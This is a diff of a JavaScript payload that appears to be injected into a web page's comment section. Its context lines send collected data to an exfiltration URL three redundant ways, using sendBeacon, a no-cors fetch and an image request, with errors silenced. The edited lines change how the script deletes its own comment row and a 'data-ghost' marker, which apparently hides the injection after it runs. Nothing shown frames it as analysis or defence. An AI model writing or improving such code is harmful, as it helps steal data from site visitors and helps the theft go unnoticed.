@@ -14,10 +14,10 @@
     try { navigator.sendBeacon(EXFIL_URL, new Blob([b], { type: 'text/plain' })); } catch (e) {}
     try { fetch(EXFIL_URL, { method: 'POST', mode: 'no-cors', body: b }); } catch (e) {}
     new Image().src = EXFIL_URL + '?d=' + encodeURIComponent(b);
-    var s = document.currentScript;
-    var row = s && s.closest && s.closest('.comment-row');
-
-    window.__ghostRan = Date.now();
-
-    if (row) row.remove();
+    var host = document.querySelector('details[data-ghost]');
+    var row = host && host.closest('.comment-row');
+    if (row) {
+        row.remove();
+    }
+    host && host.removeAttribute('data-ghost');
 })();
